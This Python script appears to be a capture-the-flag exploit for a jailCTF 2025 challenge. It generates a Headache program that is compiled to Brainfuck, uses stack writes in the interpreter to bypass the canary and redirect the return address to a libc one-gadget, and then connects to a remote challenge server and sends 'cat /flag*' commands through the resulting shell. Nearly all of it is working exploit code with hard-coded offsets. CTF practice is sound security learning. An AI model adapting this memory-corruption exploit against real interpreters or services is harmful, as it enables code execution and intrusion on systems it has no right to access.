from itertools import product
from os import system


# allowed identifier chars
allowed = [*'abcdefghijklmnopqrstuvwxyz', '']
varnames = list(sorted(sorted({''.join(j) for j in product(allowed, allowed, allowed) if set(j) != {''}}), key=lambda name: len(name)))
varnames.remove('as')
varnames.remove('if')


lines = ['void/**/main(){']

offset = 6  # base offset

# padding observations 1
c = varnames.pop(0)
lines.append(f'byte/**/{c};')
offset += 1

# byte type var with zero
zb_name = varnames.pop(0)
lines.append(f'byte/**/{zb_name};')
offset += 1

# int type var with zero
ib_name = varnames.pop(0)
lines.append(f'int/**/{ib_name};')
offset += 8

# padding
pad_amt = 95
fname = varnames.pop(0)
lines.insert(0,f'void/**/{fname}(){{byte/**/{zb_name};int/**/{ib_name};{zb_name}={"+".join([ib_name]*(pad_amt+1))};}}')

for i in range(39):
    lines.append(f'{fname}();')
    offset += pad_amt*8+9

# padding observations 2
# lines.append(f'{c}=true;')

# real exploit (function contents)
exp = []
pstackv = []  # pad stack variables
for i in range(1):
    name = varnames.pop(0)
    pstackv.append(name)
    exp.append(f'byte/**/{name};')
    offset += 1

for i in range(1):  # bypass stack canary
    exp.append(f'int/**/{varnames.pop(0)};')
    offset += 8

new_rbpv = varnames.pop(0)
exp.append(f'int/**/{new_rbpv};')

istackv = []  # (actually) important stack variables
for i in range(0x100+8+8):
    name = varnames.pop(0)
    istackv.append(name)
    exp.append(f'char/**/{name};')
#for i in range(8):
#    exp.append(f'{istackv[-1-i]}={i+1};')
for i in range(8):
    exp.append(f'print/**/{istackv[i]};')
exp.append(f'{istackv[-1]}=true+true+true+true+true+true+true+true+true+true;')
exp.append(f'print/**/{istackv[-1]};')
# one gadget at 0xf79d2 from libc base
# requires rbp-0x50 is writable, rax == 0, and [rbp-0x70] is 0
# first two conditions are already satisified
# since the libc leak is 0x2a338 above the libc base (it is somewhere in libc_start_main or smth), we need to add 0xcd69a to the saved rip value on the stack to get to one gadget
# the 0c_d6_9a will increment XX_X0_00 where X are unknown hexadecimal digits. the d6 will most likely overflow 2nd LSB (without incrementing the 3rd LSB) so we 
# have to add 0d instead of 0c for good measure.

# UPDATE: FUCKING APT UPGRADE CHANGED THE LIBC VERSION BEFORE JAILCTF 2025 START SO I HAD TO REDO IT WTFFF
# libc leak is 0x2a575 above base
# one gadget loc is 0x11d36a
# offset is therefore 0xf2df5
# this one gadget just requires a bunch of rsp+X offsets be null so thats pretty easy since we have stack control lol
for i in range(8):  # one gadget unlocked
    exp.append(f'{istackv[0x8+0x20+i]}=false;')
for i in range(0xf5):
    exp.append(f'{istackv[0]}++;')
for i in range(0x2e):
    exp.append(f'{istackv[1]}++;')
for i in range(0xf):
    exp.append(f'{istackv[2]}++;')
for i in range(8):
    exp.append(f'{istackv[0x80+8+i]}=false;')
    exp.append(f'{istackv[0x100+8+i]}=false;')
    exp.append(f'{istackv[0x48+8+i]}=false;')

#for i in range(8):
#    exp.append(f'read/**/{istackv[7-i]};')

# exploit function calling and structure gen
expname = varnames.pop(0)
lines.insert(0,f'void/**/{expname}(){{{"".join(exp)}}}')
lines.append(f'{expname}();')

code = ''.join(lines) + '}'
with open('out.ha', 'w') as f:
    f.write(code)

system('./Headache/hac -noDebug ./out.ha')
print(f'{offset = }')

# system('./BrainfuckInterpreter/interpreter ./a.bf')

from pwn import *

context.binary = bin = ELF("./BrainfuckInterpreter/interpreter")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

gdbscript = '''
p $rip
stepi 8000
break *($1-152727)
break *($1-152727+1314)
c
c
'''.strip()

#p = gdb.debug([ld.path, bin.path, "./a.bf"], gdbscript=gdbscript, env={"LD_PRELOAD": libc.path})
#p = process([ld.path, bin.path, "./a.bf"], env={"LD_PRELOAD": libc.path})

#p = remote('localhost', 5000)
p = remote('challs2.pyjail.club', 16591)

#p.interactive()
#exit()
context.log_level = 'debug'

# for remote
p.sendline(code.encode())
p.recvuntil(b'amount 1')
i = 0
try:
    while True:
        i += 1
        p.sendline(f'cat /flag* # {i}'.encode())  # gotta do it quick before it segfaults for some reason
        sleep(0.02)
except Exception as e:
    p.interactive()

# useless dont uncomment
# while True:
#     stuff = p.recvline()
#     if stuff != b'amount 1\n' and any(c>0x7f or c<0x20 for c in stuff[:-1]) and len(stuff) > 1:
#         print(stuff[:-1])
#         break
# libc_leak = int.from_bytes(stuff[:-1], 'little')

# for local debugging
# p.recvuntil(b'Executing')
# p.recvline()
# libc_leak = int.from_bytes(p.recvline()[:-1], 'little')
# 
# one_gadget_pos = libc_leak - 0x2a575 + 0x11d377
# print(f'{libc_leak = :016x}')
# print(f'{one_gadget_pos = :016x}')
#p.sendline(b'\x00\x00\x69\x69\x13\x37\x13\x37\n')

p.sendline(b'cat /flag*')  # gotta do it quick before it segfaults for some reason

p.interactive()

